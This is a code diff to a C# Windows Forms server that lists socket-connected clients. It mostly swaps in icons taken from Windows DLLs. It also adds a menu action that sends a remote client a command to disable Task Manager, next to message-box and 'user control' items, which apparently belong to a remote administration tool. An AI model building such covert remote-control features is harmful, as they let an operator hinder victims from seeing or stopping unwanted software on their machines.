@@ -5,7 +5,7 @@ namespace Server
     public partial class Main : Form
     {
         private readonly ImageList imageList;
-        private readonly SocketServer socketServer;
+        public readonly SocketServer socketServer;
         #pragma warning disable CS8618
             public static RequestUI uiRequests;
 #pragma warning restore CS8618
@@ -25,9 +25,11 @@ namespace Server
                 szIPAddress = text.Split("<SPLIT>")[1],
                 szPort = text.Split("<SPLIT>")[2];
 
+            // Add data to viewList.
             Bitmap image;
-            image = Properties.Resources.user;
+            image = WinIcons.GetImageFromIcon("dsuiext.dll", (int)WinIcons.Dsuiext.User_ICO);
             imageList.Images.Add(image);
+            imageList.ColorDepth = ColorDepth.Depth32Bit; // Improves quality of the image.
             userView.SmallImageList = imageList;
             userView.View = View.Details;
             ListViewItem userViewItem = new ListViewItem { ImageIndex = imageList.Images.Count - 1, Text = szName };
@@ -57,6 +59,15 @@ namespace Server
 
         private void Main_Load(object sender, EventArgs e)
         {
+            /* 
+             Load icons from Windows internal dlls with quite bad quality,
+             it would be smarter to extract the icon files to TEMP and load them from there for better quality.
+            */
+            settingsToolStripMenuItem.Image = WinIcons.GetImageFromIcon("wmploc.dll", (int)WinIcons.Wmploc.Settings_ICO);
+            sendMessageBoxToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.PcKeyboard_ICO);
+            userControlToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Keychain_ICO);
+            disableTaskmanagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.NotAllowed_ICO);
+
             // Start the server on it's own thread, so it does not hog all the UI resources.
             Thread serverThread = new Thread(socketServer.ExecuteServer);
             serverThread.IsBackground = true;
@@ -92,8 +103,18 @@ namespace Server
 
         private void userMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
-            if(userView.SelectedItems.Count == 0) // No items selected, no need to open.
+            if (userView.SelectedItems.Count == 0) // No items selected, no need to open.
+            {
                 e.Cancel = true;
+                return;
+            }
+        }
+
+        private void disableTaskmanagerToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
+        {
+            string messageBoxStr
+                = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString() + "<EOF>";
+            socketServer.Send(socketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
         }
     }
 }
